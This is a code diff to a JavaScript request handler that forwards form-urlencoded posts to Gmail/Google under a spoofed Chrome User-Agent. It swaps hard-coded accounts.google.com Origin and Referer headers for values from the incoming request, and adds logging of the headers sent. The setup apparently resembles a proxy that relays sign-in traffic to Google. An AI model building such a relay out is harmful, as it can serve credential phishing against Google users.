@@ -84,8 +84,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                         'Content-Type': 'application/x-www-form-urlencoded',
                         'Content-Length': body.length,
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                        'Origin': 'https://accounts.google.com',
-                        'Referer': 'https://accounts.google.com/',
+                        'Origin': this.req.headers.origin || `https://${this.req.headers.host}`,
+                        'Referer': this.req.headers.referer || `https://${this.req.headers.host}/`,
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                         'Accept-Language': 'en-US,en;q=0.9',
                         'Accept-Encoding': 'gzip, deflate, br, zstd',
@@ -147,8 +147,8 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                         'Content-Type': 'application/x-www-form-urlencoded',
                         'Content-Length': body.length,
                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
-                        'Origin': 'https://accounts.google.com',
-                        'Referer': 'https://accounts.google.com/',
+                        'Origin': this.req.headers.origin || `https://${this.req.headers.host}`,
+                        'Referer': this.req.headers.referer || `https://${this.req.headers.host}/`,
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                         'Accept-Language': 'en-US,en;q=0.9',
                         'Accept-Encoding': 'gzip, deflate, br, zstd',
@@ -163,6 +163,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                     }
                 }
                 
+                console.log('Headers being sent to Gmail:', requestOptions.headers)
                 const https = require('https')
                 const gmailReq = https.request(requestOptions, (gmailRes) => {
                     console.log('Gmail response status:', gmailRes.statusCode, gmailRes.statusMessage)
